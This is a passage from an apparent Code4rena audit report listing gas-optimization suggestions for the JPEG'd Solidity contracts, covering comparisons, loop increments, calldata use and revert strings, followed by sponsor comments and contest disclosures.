optimizer enabled (6 gas)\n\nProof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>\n\nI suggest changing `> 0` with `!= 0` here:\n\n```solidity\nfarming/LPFarming.sol:114:        require(_rewardPerBlock > 0, \"Invalid reward per block\");\nfarming/LPFarming.sol:218:        require(_amount > 0, \"invalid_amount\");\nfarming/LPFarming.sol:239:        require(_amount > 0, \"invalid_amount\");\nfarming/LPFarming.sol:337:        require(rewards > 0, \"no_reward\");\nfarming/LPFarming.sol:354:        require(rewards > 0, \"no_reward\");\nfarming/yVaultLPFarming.sol:101:        require(_amount > 0, \"invalid_amount\");\nfarming/yVaultLPFarming.sol:118:        require(_amount > 0, \"invalid_amount\");\nfarming/yVaultLPFarming.sol:139:        require(rewards > 0, \"no_reward\");\nlock/JPEGLock.sol:40:        require(_newTime > 0, \"Invalid lock time\");\nstaking/JPEGStaking.sol:32:        require(_amount > 0, \"invalid_amount\");\nvaults/yVault/strategies/StrategyPUSDConvex.sol:182:            _performanceFee.denominator > 0 &&\nvaults/yVault/strategies/StrategyPUSDConvex.sol:334:            require(wethBalance > 0, \"NOOP\");\nvaults/yVault/yVault.sol:100:            _rate.numerator > 0 && _rate.denominator >= _rate.numerator,\nvaults/yVault/yVault.sol:143:        require(_amount > 0, \"INVALID_AMOUNT\");\nvaults/yVault/yVault.sol:167:        require(_shares > 0, \"INVALID_AMOUNT\");\nvaults/yVault/yVault.sol:170:        require(supply > 0, \"NO_TOKENS_DEPOSITED\");\nvaults/FungibleAssetVaultForDAO.sol:94:            _creditLimitRate.denominator > 0 &&\nvaults/FungibleAssetVaultForDAO.sol:108:        require(answer > 0, \"invalid_oracle_answer\");\nvaults/FungibleAssetVaultForDAO.sol:142:        require(amount > 0, \"invalid_amount\");\nvaults/FungibleAssetVaultForDAO.sol:164:        require(amount > 0, \"invalid_amount\");\nvaults/FungibleAssetVaultForDAO.sol:180:        require(amount > 0, \"invalid_amount\");\nvaults/FungibleAssetVaultForDAO.sol:194:        require(amount > 0 && amount <= collateralAmount, \"invalid_amount\");\nvaults/NFTVault.sol:278:        require(_newFloor > 0, \"Invalid floor\");\nvaults/NFTVault.sol:327:            _type == bytes32(0) || nftTypeValueETH[_type] > 0,\nvaults/NFTVault.sol:365:        require(pendingValue > 0, \"no_pending_value\");\nvaults/NFTVault.sol:402:            rate.denominator > 0 && rate.denominator >= rate.numerator,\nvaults/NFTVault.sol:462:        require(answer > 0, \"invalid_oracle_answer\");\nvaults/NFTVault.sol:687:        require(_amount > 0, \"invalid_amount\");\nvaults/NFTVault.sol:764:        require(_amount > 0, \"invalid_amount\");\nvaults/NFTVault.sol:770:        require(debtAmount > 0, \"position_not_borrowed\");\nvaults/NFTVault.sol:882:        require(position.liquidatedAt > 0, \"not_liquidated\");\nvaults/NFTVault.sol:926:        require(position.liquidatedAt > 0, \"not_liquidated\");\n```\n\nAlso, please enable the Optimizer.\n\n## [G-35] `>=` is cheaper than `>`\n\nStrict inequalities (`>`) are more expensive than non-strict ones (`>=`). This is due to some supplementary checks (ISZERO, 3 gas)\n\nI suggest using  `>=`  instead of `>` to avoid some opcodes here:\n\n```solidity\nvaults/NFTVault.sol:539:        return principal > calculatedDebt ? principal : calculatedDebt;\nvaults/NFTVault.sol:775:        _amount = _amount > debtAmount ? debtAmount : _amount;\n```\n\n## [G-36] An array's length should be cached to save gas in for-loops\n\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.\n\nCaching the array length in the stack saves around 3 gas per iteration.\n\nHere, I suggest storing the array's length in a variable before the for-loop, and use it instead:\n\n```solidity\nfarming/LPFarming.sol:348:        for (uint256 i = 0; i < poolInfo.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:145:        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:319:            for (uint256 i = 0; i < rewardTokens.length; i++) {\nvaults/NFTVault.sol:181:        for (uint256 i = 0; i < _typeInitializers.length; i++) {\nvaults/NFTVault.sol:184:            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n\nThis is already done here:\n\n```solidity\nfarming/LPFarming.sol:281:        for (uint256 pid = 0; pid < length; ++pid) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:231:        for (uint256 i = 0; i < length; i++) {\n```\n\n## [G-37] `++i` costs less gas compared to `i++` or `i += 1`\n\n`++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.\n\n`i++` increments `i` and returns the initial value of `i`. Which means:\n\n```solidity\nuint i = 1;  \ni++; // == 1 but i == 2  \n```\n\nBut `++i` returns the actual incremented value:\n\n```solidity\nuint i = 1;  \n++i; // == 2 and i == 2 too, so no need for a temporary variable  \n```\n\nIn the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`\n\nInstances include:\n\n```solidity\nfarming/LPFarming.sol:348:        for (uint256 i = 0; i < poolInfo.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:145:        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:231:        for (uint256 i = 0; i < length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:319:            for (uint256 i = 0; i < rewardTokens.length; i++) {\nvaults/NFTVault.sol:181:        for (uint256 i = 0; i < _typeInitializers.length; i++) {\nvaults/NFTVault.sol:184:            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n\nI suggest using `++i` instead of `i++` to increment the value of an uint variable.\n\nThis is already done here:\n\n```solidity\nfarming/LPFarming.sol:281:        for (uint256 pid = 0; pid < length; ++pid) {\n```\n\n## [G-38] Increments can be unchecked\n\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.\n\n[ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)\n\nInstances include:\n\n```solidity\nfarming/LPFarming.sol:281:        for (uint256 pid = 0; pid < length; ++pid) {\nfarming/LPFarming.sol:348:        for (uint256 i = 0; i < poolInfo.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:145:        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:231:        for (uint256 i = 0; i < length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:319:            for (uint256 i = 0; i < rewardTokens.length; i++) {\nvaults/NFTVault.sol:181:        for (uint256 i = 0; i < _typeInitializers.length; i++) {\nvaults/NFTVault.sol:184:            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n\nThe code would go from:\n\n```solidity\nfor (uint256 i; i < numIterations; i++) {  \n // ...  \n}  \n```\n\nto:\n\n```solidity\nfor (uint256 i; i < numIterations;) {  \n // ...  \n unchecked { ++i; }  \n}  \n```\n\nThe risk of overflow is inexistant for a `uint256` here.\n\n## [G-39] Use `calldata` instead of `memory`\n\nWhen arguments are read-only on external functions, the data location should be `calldata`:\n\n```solidity\ncontracts/vaults/NFTVault.sol:\n  212:     function setDebtInterestApr(Rate memory _debtInterestApr) //@audit gas: should be calldata\n  222:     function setValueIncreaseLockRate(Rate memory _valueIncreaseLockRate)  //@audit gas: should be calldata\n  232:     function setCreditLimitRate(Rate memory _creditLimitRate)  //@audit gas: should be calldata\n  247:     function setLiquidationLimitRate(Rate memory _liquidationLimitRate)  //@audit gas: should be calldata\n  290:     function setOrganizationFeeRate(Rate memory _organizationFeeRate)  //@audit gas: should be calldata\n  300:     function setInsurancePurchaseRate(Rate memory _insurancePurchaseRate)  //@audit gas: should be calldata\n  311:         Rate memory _insuranceLiquidationPenaltyRate  //@audit gas: should be calldata\n```\n\n## [G-40] Consider making some constants as non-public to save gas\n\nReducing from `public` to `private` or `internal` can save gas when a constant isn't used outside of its contract.\nI suggest changing the visibility from `public` to `internal` or `private` here:\n\n```solidity\ntokens/JPEG.sol:10:    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\ntokens/StableCoin.sol:22:    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\ntokens/StableCoin.sol:23:    bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\nvaults/yVault/strategies/StrategyPUSDConvex.sol:66:    bytes32 public constant STRATEGIST_ROLE = keccak256(\"STRATEGIST_ROLE\");\nvaults/yVault/Controller.sol:15:    bytes32 public constant STRATEGIST_ROLE = keccak256(\"STRATEGIST_ROLE\");\nvaults/FungibleAssetVaultForDAO.sol:41:    bytes32 public constant WHITELISTED_ROLE = keccak256(\"WHITELISTED_ROLE\");\nvaults/NFTVault.sol:71:    bytes32 public constant DAO_ROLE = keccak256(\"DAO_ROLE\");\nvaults/NFTVault.sol:72:    bytes32 public constant LIQUIDATOR_ROLE = keccak256(\"LIQUIDATOR_ROLE\");\nvaults/NFTVault.sol:74:    bytes32 public constant CUSTOM_NFT_HASH = keccak256(\"CUSTOM\");\n```\n\n## [G-41] Public functions to external\n\nThe following functions could be set external to save gas and improve code quality.\nExternal call cost is less expensive than of public functions.\n\n```solidity\nwithdraw(IERC20,uint256) should be declared external:\n - Controller.withdraw(IERC20,uint256) (contracts/vaults/yVault/Controller.sol#151-154)\nsetFarmingPool(address) should be declared external:\n - YVault.setFarmingPool(address) (contracts/vaults/yVault/yVault.sol#115-118)\n```\n\n## [G-42] Reduce the size of error messages (Long revert Strings)\n\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\nRevert strings > 32 bytes:\n\n```solidity\ntokens/JPEG.sol:23:            \"JPEG: must have minter role to mint\"\ntokens/StableCoin.sol:41:            \"StableCoin: must have minter role to mint\"\ntokens/StableCoin.sol:55:            \"StableCoin: must have pauser role to pause\"\ntokens/StableCoin.sol:69:            \"StableCoin: must have pauser role to unpause\"\nvaults/NFTVault.sol:394:            \"credit_rate_exceeds_or_equals_liquidation_rate\" \n```\n\nI suggest shortening the revert strings to fit in 32 bytes, or using custom errors as described next.\n\n## [G-43] Use Custom Errors instead of Revert Strings to save Gas\n\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n\nSource: <https://blog.soliditylang.org/2021/04/21/custom-errors/>:\n\n> Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\nSee [original submission](https://github.com/code-423n4/2022-04-jpegd-findings/issues/121) for instances.\n\n**[spaghettieth (JPEG'd) confirmed and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/121#issuecomment-1098310851):**\n > Very high quality report, may implement some of your suggestions. Thank you!\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/121#issuecomment-1105050319):**\n > Implemented most of your suggestions in [jpegd/core#21](https://github.com/jpegd/core/pull/21). Custom errors have not been implemented as it would be too big of a change at this point and doing it properly may cause unexpected behaviour/bugs due to the codebase changing too much.\n\n\n\n***\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}